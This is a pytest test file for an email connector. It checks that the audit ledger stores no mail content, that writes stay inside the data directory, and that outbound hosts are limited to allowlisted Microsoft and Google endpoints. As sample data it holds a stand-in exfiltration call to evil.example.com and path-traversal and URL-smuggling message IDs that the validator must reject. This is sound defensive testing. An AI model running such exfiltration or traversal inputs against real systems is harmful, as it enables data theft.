"""Containment: what the connector may WRITE, and where it may REACH.

The three assertions here are the executable form of three sentences a buyer
is told. Each was written because a security-minded MSP asked the question
directly (2026-08-18), and a design argument is a weaker answer than a test
that fails when the design stops being true:

1. The ledger records ACTIONS, not mail content. ``ledger.py`` says so in its
   docstring and the field list backs it up -- but the ``detail`` field is a
   free string, so the claim rests on every CALL SITE passing a folder name
   rather than a subject line. That is exactly the kind of invariant prose
   cannot hold, so it is asserted against the source here.

2. The connector writes to three known paths and nowhere else. "Your storage,
   your retention policy" is only true if the set of files it creates is
   knowable.

3. The connector reaches Microsoft Graph and Google, and no other host. The
   Outlook adapter pins ``base_url`` and takes path SEGMENTS rather than urls;
   this asserts no code path smuggles a full url past that.

Scanning notes: comments and docstrings are STRIPPED before scanning, matching
``test_security_surface``. This file documents the boundaries it forbids, and
documenting a boundary is required -- crossing it is the defect.
"""

from __future__ import annotations

import ast
from pathlib import Path

import pytest

from inbox_zero_connector.config import data_dir
from inbox_zero_connector.providers.base import ProviderError
from inbox_zero_connector.providers.outlook import provider as outlook
from inbox_zero_connector.services.audit import ledger as ledger
from inbox_zero_connector.services.auth import scopes as scopes

SRC = Path(scopes.__file__).parent
PY_FILES = sorted(SRC.rglob("*.py"))


def _executable_string_literals(source: str) -> list[str]:
    """Every string literal that is NOT a docstring.

    Comments never appear (the AST drops them) and docstrings are removed by
    name, so the modules that DOCUMENT an endpoint they refuse to call stay
    legal while a literal in executable position does not.

    An earlier version of this helper blanked every string, which made the
    host scan vacuous -- it could not have found a url if one were there. The
    not-vacuous test below exists because that is exactly the failure mode.
    """
    tree = ast.parse(source)
    docstrings: set[int] = set()
    for node in ast.walk(tree):
        if not isinstance(node, ast.Module | ast.ClassDef | ast.FunctionDef | ast.AsyncFunctionDef):
            continue
        body = getattr(node, "body", [])
        if (
            body
            and isinstance(body[0], ast.Expr)
            and isinstance(body[0].value, ast.Constant)
            and isinstance(body[0].value.value, str)
        ):
            docstrings.add(id(body[0].value))
    return [
        node.value
        for node in ast.walk(tree)
        if isinstance(node, ast.Constant)
        and isinstance(node.value, str)
        and id(node) not in docstrings
    ]


def _append_call_arguments(tree: ast.AST) -> list[ast.expr]:
    """Every argument handed to any ``append`` call in a parsed module.

    Positional and keyword arguments are returned together because ``detail``
    is reachable either way and a scan that checked only one would be a scan
    with a documented hole in it.
    """
    arguments: list[ast.expr] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.Call):
            continue
        func = node.func
        name = func.attr if isinstance(func, ast.Attribute) else getattr(func, "id", "")
        if name != "append":
            continue
        arguments.extend(node.args)
        arguments.extend(keyword.value for keyword in node.keywords)
    return arguments


# --------------------------------------------------------------------------
# 1. The ledger records actions, never content.
# --------------------------------------------------------------------------

LEDGER_CONTENT_FIELDS = frozenset({"subject", "body", "snippet", "preview", "address", "sender"})
"""Names that would mean mail content had reached a receipt."""


def test_ledger_entry_declares_no_content_carrying_field() -> None:
    """The row schema itself has no place to put a subject or a body.

    This is the structural half of the promise: even a careless caller cannot
    persist content through a field that does not exist.
    """
    declared = set(ledger.LedgerEntry.model_fields)
    assert not (declared & LEDGER_CONTENT_FIELDS), (
        f"LedgerEntry gained a content-shaped field: {sorted(declared & LEDGER_CONTENT_FIELDS)}. "
        "A leaked ledger must not be a leaked mailbox."
    )


def test_ledger_entry_forbids_extra_fields() -> None:
    """``extra='forbid'`` is what stops a caller inventing ``subject=`` at the call site."""
    assert ledger.LedgerEntry.model_config.get("extra") == "forbid"


def test_no_ledger_append_passes_a_content_bearing_expression_as_detail() -> None:
    """Every ``ledger.append`` call site passes an id, a literal, or a folder name.

    THE POINT OF THIS TEST: ``detail`` is a free string, so the "actions, not
    content" promise is a property of the CALL SITES, not of the schema. This
    walks every call in the package and fails if one passes an attribute that
    reads like mail content -- ``message.subject``, ``msg.body``, and so on.
    """
    offenders = [
        f"{path.name}:{arg.lineno} -> .{arg.attr}"
        for path in PY_FILES
        for arg in _append_call_arguments(ast.parse(path.read_text(encoding="utf-8")))
        if isinstance(arg, ast.Attribute) and arg.attr in LEDGER_CONTENT_FIELDS
    ]
    assert not offenders, (
        f"A ledger receipt is being handed mail content: {offenders}. "
        "The ledger records actions -- ids, folders, flags -- never content."
    )


def test_the_content_field_guard_is_not_vacuous() -> None:
    """The guard above must actually reject the thing it claims to reject.

    Without this, a typo in ``LEDGER_CONTENT_FIELDS`` would make the previous
    test pass forever while checking nothing.
    """
    tree = ast.parse("ledger.append('google', 'file_message', mid, message.subject)")
    found = [
        arg.attr
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        for arg in node.args
        if isinstance(arg, ast.Attribute) and arg.attr in LEDGER_CONTENT_FIELDS
    ]
    assert found == ["subject"]


# --------------------------------------------------------------------------
# 2. Filesystem containment.
# --------------------------------------------------------------------------


def test_a_full_ledger_write_creates_no_file_outside_the_data_dir(tmp_path: Path) -> None:
    """Receipts land in the configured data dir and nowhere else.

    "Point it at your own storage" is only a real offer if the set of paths
    the connector writes is closed. ``isolated_dirs`` already redirects config
    and data into ``tmp_path``; this asserts nothing escaped that redirect.
    """
    before = {p for p in tmp_path.rglob("*") if p.is_file()}
    ledger.append("google", ledger.ACTION_FILE, "msg-1", "Clients")
    ledger.append("microsoft", ledger.ACTION_IMPORTANT, "msg-2", "true")
    after = {p for p in tmp_path.rglob("*") if p.is_file()}

    created = after - before
    assert created, "nothing was written at all -- the test proves nothing"
    outside = [p for p in created if data_dir() not in p.parents]
    assert not outside, f"wrote outside the configured data dir: {outside}"


def test_the_ledger_is_opened_append_only_everywhere() -> None:
    """No code path truncates or rewrites a receipt.

    An audit trail that can be rewritten is not an audit trail. Asserted at
    the source level because a single ``"w"`` would silently erase history.
    """
    source = ledger.__file__
    tree = ast.parse(Path(source).read_text(encoding="utf-8"))
    opens = [
        node
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr == "open"
    ]
    modes = [
        argument.value
        for node in opens
        for argument in node.args
        if isinstance(argument, ast.Constant) and isinstance(argument.value, str)
    ]
    assert modes, "no open() call found -- the scan is looking in the wrong place"
    assert all(m in {"a", "r"} for m in modes), (
        f"ledger opened with a truncating or rewriting mode: {modes}"
    )


# --------------------------------------------------------------------------
# 3. Network containment.
# --------------------------------------------------------------------------

ALLOWED_HOST_LITERALS = (
    "https://graph.microsoft.com",
    "https://login.microsoftonline.com",
    "https://accounts.google.com",
    "https://oauth2.googleapis.com",
    "http://localhost",
)
"""Every network destination the connector may name, and nothing else.

This list IS the egress surface, which is why it is spelled out rather than
pattern-matched: two Microsoft endpoints (Graph and its login server), two
Google OAuth endpoints, and the loopback redirect the desktop consent flow
hands back to. Gmail itself is reached through Google's client library, which
builds its endpoint from a service name -- there is no url to pin.

Adding an entry here is a posture change and should be argued for in review.
"""

SCOPE_PREFIXES = (
    "https://www.googleapis.com/auth/",
    "https://mail.google.com/",
)
"""OAuth SCOPE identifiers, which are url-shaped but are not hosts.

They are names in Google's permission vocabulary, never fetched. They are
excluded from the host scan by prefix rather than one by one, so that adding
or removing a scope is governed by ``test_security_surface`` -- which is where
scope posture belongs -- instead of silently passing or failing here.
"""


def test_the_graph_client_is_pinned_to_the_graph_base_url() -> None:
    """The Outlook adapter cannot be aimed at another host."""
    assert outlook.GRAPH_BASE == "https://graph.microsoft.com/v1.0"


def test_no_module_names_an_unexpected_https_host() -> None:
    """No source file contains an http(s) literal outside the allowed set.

    THE POINT: an exfiltration path does not have to be a send tool. A single
    ``httpx.post("https://...")`` would do it. This makes any new outbound
    host a test failure that has to be argued for, rather than a diff nobody
    notices. Docstrings and comments are stripped first, so the modules that
    DOCUMENT endpoints they refuse to call stay legal.
    """
    offenders: list[str] = []
    for path in PY_FILES:
        for literal in _executable_string_literals(path.read_text(encoding="utf-8")):
            if not literal.startswith("http"):
                continue
            if literal.startswith(SCOPE_PREFIXES):
                continue
            if literal.startswith(ALLOWED_HOST_LITERALS):
                continue
            offenders.append(f"{path.name} -> {literal}")
    assert not offenders, (
        f"a new outbound host appears in executable source: {offenders}. "
        "Every host the connector can reach is part of its security posture."
    )


def test_the_host_scan_is_not_vacuous() -> None:
    """The scan must flag a smuggled host, or it is checking nothing."""
    literals = _executable_string_literals('x = httpx.post("https://evil.example.com/collect")\n')
    found = [lit for lit in literals if lit.startswith("http")]
    assert found == ["https://evil.example.com/collect"]

    documented = _executable_string_literals(
        '"""See https://evil.example.com for what we refuse."""\n'
    )
    assert not [lit for lit in documented if lit.startswith("http")], (
        "a docstring naming an endpoint must stay legal -- documenting a boundary is not crossing it"
    )


@pytest.mark.parametrize(
    "hostile",
    ["../../etc/passwd", "https://evil.example.com/collect", "a/b", "?redirect=evil.com"],
)
def test_a_hostile_message_id_is_refused_before_any_request(hostile: str) -> None:
    """A caller cannot smuggle a url, a traversal, or a query into the path.

    Graph calls take SEGMENTS, not urls, and an id is validated against a
    strict grammar BEFORE anything is assembled -- so aiming the adapter at
    another host would require editing it, not merely calling it with a
    hostile argument. This is the practical half of the pinned-base-url claim:
    pinning the host is worthless if the path can escape it.
    """
    with pytest.raises(ProviderError):
        outlook._safe_message_id(hostile)


def test_the_message_id_guard_accepts_a_real_id() -> None:
    """The grammar must pass a genuine Graph id, or it is refusing everything."""
    real = "AAMkAGI2THVSAAA" * 2
    assert outlook._safe_message_id(real) == real
